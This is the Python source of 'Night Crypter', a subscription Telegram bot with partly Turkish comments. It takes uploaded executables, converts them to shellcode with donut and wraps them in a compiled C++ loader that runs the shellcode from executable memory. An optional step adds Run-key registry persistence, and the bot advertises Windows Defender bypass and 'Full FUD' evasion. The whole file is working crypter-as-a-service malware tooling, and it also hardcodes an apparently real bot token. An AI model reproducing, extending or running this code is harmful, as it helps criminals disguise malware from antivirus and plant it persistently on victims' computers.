# bot.py (Donut shellcode ile güncellenmiş)
import json
import os
from datetime import datetime, timedelta
from typing import Dict, Any, Optional
import subprocess
import donut
import warnings
from telegram.warnings import PTBUserWarning
import pytz
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
    ConversationHandler,
)

# ========== AYARLAR ==========
TOKEN = "8288860382:AAEBxNpEl81cnGKnOmauGEmMm7XkblkePYA"
ADMIN_ID = 7279467950  # kendi telegram id'n
USERS_FILE = "json/users.json"
TIMEZONE = "Europe/Istanbul"
tzinfo = pytz.timezone(TIMEZONE)

warnings.filterwarnings("ignore", category=PTBUserWarning)

# Dosya saklama ayarları
STUBS_DIR = "stubs"
MAX_FILE_SIZE = 8 * 1024 * 1024  # 8 MB sınırı

# ============================

# ---------- JSON işlemleri ----------
def ensure_file(path: str, default):
    folder = os.path.dirname(path)
    if folder and not os.path.exists(folder):
        os.makedirs(folder, exist_ok=True)
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(default, f, indent=4, ensure_ascii=False)

def load_json(path: str) -> Dict[str, Any]:
    ensure_file(path, {})
    with open(path, "r", encoding="utf-8") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_json(path: str, data) -> None:
    ensure_file(path, data if isinstance(data, dict) else {})
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# ---------- Kullanıcı işlevleri ----------
def ensure_user_record(user_id: int) -> None:
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        users[key] = {
            "a_expiry": None,
            "wd_bypass": False,
            "daily_used": 0,
            "daily_limit": 1
        }
        save_json(USERS_FILE, users)

def iso_now_plus_days(days: int) -> str:
    return (datetime.now(tzinfo) + timedelta(days=days)).isoformat()

def parse_iso(dt_iso: Optional[str]) -> Optional[datetime]:
    if not dt_iso:
        return None
    try:
        return datetime.fromisoformat(dt_iso).astimezone(tzinfo)
    except Exception:
        return None

def human_dt(dt: Optional[datetime]) -> str:
    if not dt:
        return "Not active"
    return dt.strftime("%d.%m.%Y %H:%M")

def set_expiry(user_id: int, plan: str, days: int) -> bool:
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        ensure_user_record(user_id)
        users = load_json(USERS_FILE)
    expiry_iso = iso_now_plus_days(days)
    if plan == "a":
        users[key]["a_expiry"] = expiry_iso
    else:
        return False
    save_json(USERS_FILE, users)
    return True

def expiry_status_for_display(expiry_iso: Optional[str]) -> str:
    if not expiry_iso:
        return "Not active"
    dt = parse_iso(expiry_iso)
    if not dt:
        return "Invalid date"
    now = datetime.now(tzinfo)
    if dt <= now:
        return "Expired"
    return human_dt(dt)

def set_daily_limit(user_id: int, limit: int) -> None:
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        ensure_user_record(user_id)
        users = load_json(USERS_FILE)
    users[key]["daily_limit"] = int(limit)
    save_json(USERS_FILE, users)

def has_active_subscription(user_id: int) -> bool:
    """Checks if a user has an active, non-expired subscription."""
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        return False

    expiry_iso = users[key].get("a_expiry")
    if not expiry_iso:
        return False

    expiry_dt = parse_iso(expiry_iso)
    if not expiry_dt:
        return False

    return expiry_dt > datetime.now(tzinfo)

def can_user_crypt(user_id: int) -> bool:
    """Checks if the user is below their daily crypt limit."""
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        ensure_user_record(user_id)
        users = load_json(USERS_FILE)
    used = users[key].get("daily_used", 0)
    limit = users[key].get("daily_limit", 1)
    return used < limit

def increment_crypt_count(user_id: int) -> None:
    """Increments the daily crypt count for a user."""
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        # This should not happen if can_user_crypt was called first, but as a safeguard:
        ensure_user_record(user_id)
        users = load_json(USERS_FILE)

    used = users[key].get("daily_used", 0)
    users[key]["daily_used"] = used + 1
    save_json(USERS_FILE, users)

def reset_all_daily_used() -> None:
    users = load_json(USERS_FILE)
    changed = False
    for uid, u in users.items():
        if u.get("daily_used", 0) != 0:
            u["daily_used"] = 0
            changed = True
    if changed:
        save_json(USERS_FILE, users)

# ---------- Yardımcı: kullanıcı stubs dizini ----------
def user_stub_dir(user_id: int) -> str:
    path = os.path.join(STUBS_DIR, str(user_id))
    os.makedirs(path, exist_ok=True)
    return path

# ---------- Bot Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    ensure_user_record(user.id)
    keyboard = [
        [InlineKeyboardButton("Profile", callback_data="profile")],
        [InlineKeyboardButton("Plans", callback_data="plans")],
        [InlineKeyboardButton("Crypter", callback_data="crypter")],
        [InlineKeyboardButton("Reset Daily (Admin)", callback_data="reset_daily")]
    ]
    reply = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🌙 Night Crypter\n\n Sub Seller: @payloadexecuter :", reply_markup=reply)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query is None:
        return
    await query.answer()
    data = query.data

    uid = str(query.from_user.id)
    users = load_json(USERS_FILE)
    user = users.get(uid)
    if not user:
        await query.edit_message_text("Kayıt bulunamadı. Lütfen /start komutunu gönder.")
        return

    if data == "profile":
        a_disp = expiry_status_for_display(user.get("a_expiry"))
        daily_used = user.get("daily_used", 0)
        daily_limit = user.get("daily_limit", 1)
        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
        reply = InlineKeyboardMarkup(keyboard)
        text = (
            f"📂 Profile\n\n"
            f"👤 ID: {uid}\n\n"
            f"⭐ Subscription: {a_disp}\n\n"
            f"🔁 Daily Crypt: {daily_used}/{daily_limit}\n"
        )
        await query.edit_message_text(text, reply_markup=reply)

    elif data == "plans":
        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
        reply = InlineKeyboardMarkup(keyboard)
        text = "Contact the admin to purchase a subscription."
        await query.edit_message_text(text, reply_markup=reply)

    elif data == "crypter":
        if has_active_subscription(query.from_user.id):
            text = "✅ Subscription active (Wd Bypass).\n\nPlease upload your .exe file to encrypt it."
        else:
            text = "❌ You do not have an active subscription.\n\nPlease contact the admin to purchase one."

        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
        reply = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply)

    elif data == "reset_daily":
        if query.from_user.id != ADMIN_ID:
            await query.answer("Yalnızca admin kullanabilir.", show_alert=True)
            return
        reset_all_daily_used()
        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
        reply = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("✅ Tüm kullanıcıların günlük sayacı sıfırlandı.", reply_markup=reply)

    elif data == "back":
        keyboard = [
            [InlineKeyboardButton("Profile", callback_data="profile")],
            [InlineKeyboardButton("Plans", callback_data="plans")],
            [InlineKeyboardButton("Crypter", callback_data="crypter")],
            [InlineKeyboardButton("Reset Daily (Admin)", callback_data="reset_daily")]
        ]
        reply = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🌙 Night Crypter\nMenüden seçim yap:", reply_markup=reply)

# ---------- Admin ve Kullanıcı Komutları ----------
async def grant_a_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Yalnızca admin kullanabilir.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Kullanım: /grant_a <user_id> <days>")
        return
    try:
        target = int(args[0])
        days = int(args[1])
    except ValueError:
        await update.message.reply_text("user_id ve days integer olmalı.")
        return
    if set_expiry(target, "a", days):
        expiry = load_json(USERS_FILE)[str(target)]["a_expiry"]
        await update.message.reply_text(f"A planı verildi -> {target} expiry: {expiry}")
        try:
            await context.bot.send_message(target, f"🎉 Sana A (Wd Killer) planı verildi. Expiry: {expiry}")
        except Exception:
            pass


async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Yalnızca admin kullanabilir.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Kullanım: /set_daily <user_id> <limit>")
        return
    try:
        target = int(context.args[0])
        limit = int(context.args[1])
    except ValueError:
        await update.message.reply_text("user_id ve limit integer olmalı.")
        return
    set_daily_limit(target, limit)
    await update.message.reply_text(f"User {target} daily limit {limit} olarak ayarlandı.")


# Conversation states
GET_FILENAME, GET_STARTUP_CHOICE = range(2)

async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the initial file upload and starts the conversation."""
    msg = update.message
    if msg is None or msg.document is None:
        return ConversationHandler.END

    doc = msg.document
    user = update.effective_user
    if user is None:
        return ConversationHandler.END
    uid = user.id

    # Check the daily limit before proceeding
    if not can_user_crypt(uid):
        u_data = load_json(USERS_FILE).get(str(uid), {})
        limit = u_data.get('daily_limit', 1)
        await msg.reply_text(f"You have already used your {limit} daily crypt(s). Please try again tomorrow.")
        return ConversationHandler.END

    if doc.file_size and doc.file_size > MAX_FILE_SIZE:
        await msg.reply_text(f"File is too large. Max size: {MAX_FILE_SIZE // (1024*1024)} MB.")
        return ConversationHandler.END

    udir = user_stub_dir(uid)
    # Use a unique name for the original uploaded file to avoid conflicts
    input_path = os.path.join(udir, f"original_{doc.file_id}.exe")

    try:
        file_obj = await context.bot.get_file(doc.file_id)
        await file_obj.download_to_drive(custom_path=input_path)
    except Exception as e:
        await msg.reply_text(f"Error downloading file: {e}")
        return ConversationHandler.END

    context.user_data['input_path'] = input_path

    await msg.reply_text("✅ File received. Please enter the desired name for your compiled file (e.g., 'my_payload.exe'):")

    return GET_FILENAME

async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the desired filename and asks about startup."""
    filename = update.message.text
    if not filename.lower().endswith('.exe'):
        filename += '.exe'

    context.user_data['output_filename'] = filename

    keyboard = [
        [
            InlineKeyboardButton("Yes", callback_data="startup_yes"),
            InlineKeyboardButton("No", callback_data="startup_no"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "Filename saved. Should the file be added to startup for persistence?",
        reply_markup=reply_markup
    )

    return GET_STARTUP_CHOICE

async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the startup choice, compiles, sends, cleans up, and ends."""
    query = update.callback_query
    await query.answer()

    startup = query.data == 'startup_yes'

    input_path = context.user_data.get('input_path')
    output_filename = context.user_data.get('output_filename')

    if not input_path or not output_filename:
        await query.edit_message_text("Error: Missing data. Please start over by sending the file again.")
        context.user_data.clear()
        return ConversationHandler.END

    uid = query.from_user.id
    udir = user_stub_dir(uid)
    # Use a unique name for the cpp file
    cpp_file_path = os.path.join(udir, f"source_{uid}.cpp")
    compiled_exe_path = os.path.join(udir, f"compiled_{uid}.exe")

    try:
        await query.edit_message_text("Processing your file... This may take a moment.")

        shellcode_bytes = donut.create(file=input_path)
        shellcode_formatted = ', '.join([f'0x{b:02x}' for b in shellcode_bytes])

        app_name_for_registry = os.path.splitext(output_filename)[0]

        # Conditionally create the line of C++ for the startup functionality
        startup_line = ""
        if startup:
            # Note: The C++ string literal for the registry key requires double backslashes
            # The app name needs to be in escaped quotes
            startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup(\"{app_name_for_registry}\", currentPath);'

        cpp_template = f'''
#include <windows.h>
#include <string.h>

void addToStartup(const char* appName, const char* appPath) {{
    HKEY hKey;
    const char* runKey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
    if (RegOpenKeyEx(HKEY_CURRENT_USER, runKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {{
        RegSetValueEx(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, strlen(appPath) + 1);
        RegCloseKey(hKey);
    }}
}}

unsigned char shellcode[] = {{
  {shellcode_formatted}
}};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    {startup_line}

    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec != NULL) {{
        memcpy(exec, shellcode, sizeof(shellcode));
        ((void(*)())exec)();
    }}
    return 0;
}}
'''
        with open(cpp_file_path, "w", encoding="utf-8") as f:
            f.write(cpp_template)

        compile_result = subprocess.run(
            ["g++", cpp_file_path, "-o", compiled_exe_path, "-mwindows"],
            capture_output=True, text=True
        )

        if compile_result.returncode != 0:
            await query.edit_message_text(f"Compilation error:\\n{compile_result.stderr}")
            return ConversationHandler.END

        with open(compiled_exe_path, "rb") as f:
            await context.bot.send_document(chat_id=uid, document=f, filename=output_filename)

        # Increment the user's daily count now that the process is successful
        increment_crypt_count(uid)

        await query.edit_message_text("✅ File created and sent successfully.")

    except Exception as e:
        print(f"File processing error: {e}")
        await query.edit_message_text(f"An error occurred while processing your file: {e}")

    finally:
        for path in [input_path, cpp_file_path, compiled_exe_path]:
            if path and os.path.exists(path):
                os.remove(path)

        context.user_data.clear()

    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels and ends the conversation."""
    await update.message.reply_text("Operation cancelled.")
    # Cleanup any lingering data
    input_path = context.user_data.get('input_path')
    if input_path and os.path.exists(input_path):
        os.remove(input_path)
    context.user_data.clear()
    return ConversationHandler.END


# ---------- Hata handler ----------
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    print("Hata:", context.error)


# =========== Başlat ===========
def main():
    ensure_file(USERS_FILE, {})

    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Document.ALL, file_upload_handler)],
        states={
            GET_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_filename)],
            GET_STARTUP_CHOICE: [CallbackQueryHandler(get_startup_choice)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("start", start))
    # Note: The main callback_handler for the menu buttons is still needed for profile, plans, etc.
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(CommandHandler("grant_a", grant_a_cmd))
    app.add_handler(CommandHandler("set_daily", set_daily_cmd))

    app.add_error_handler(error_handler)
    TeleText = """
    ---------------------------------------
       Night Crypter ( Tele Bot )
    
    - 28.09.2025 - All Rights Reversed.
    
    - Made By Payload X Violent
    
    - Methods: Semi Bypass - Full FUD
     
    - Socials [ Tg: t.me/NightCrypter ]
    ---------------------------------------
    """
    print(TeleText)
    app.run_polling()

if __name__ == "__main__":
    main()
